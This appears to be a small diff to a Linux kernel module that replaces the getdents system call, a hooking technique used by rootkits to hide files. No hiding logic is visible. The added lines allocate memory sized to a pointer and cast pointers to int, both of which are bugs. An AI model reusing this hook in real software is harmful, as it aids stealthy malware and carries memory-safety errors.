@@ -74,6 +74,8 @@ asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int co
 
   if (nread != 0) {
     int bpos = 0;
+    linux_dirent *new_dirp = kmalloc(sizeof(dirp), GFP_KERNEL);
+    printk(KERN_INFO "Size: %d\n", sizeof(dirp));
     linux_dirent *d;
     while (bpos < nread) {
       d = (linux_dirent *)((int)dirp + (int)bpos);
